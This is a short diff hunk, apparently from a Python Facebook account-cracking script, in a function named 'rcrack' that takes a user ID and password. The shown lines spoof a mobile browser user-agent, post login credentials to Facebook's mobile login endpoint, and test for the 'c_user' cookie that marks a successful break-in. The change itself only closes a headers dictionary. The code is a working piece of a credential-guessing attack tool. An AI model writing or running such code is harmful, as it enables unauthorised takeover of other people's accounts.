@@ -311,7 +311,7 @@ def rcrack(uid,pwx,tl):
  		   'sec-fetch-site': 'same-origin',
 		    'sec-fetch-user': '?1',
    		 'upgrade-insecure-requests': '1',
-  		  'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Kindle Fire HDX Build/NJH47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.92 Safari/537.36',
+  		  'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Kindle Fire HDX Build/NJH47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.92 Safari/537.36',}
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
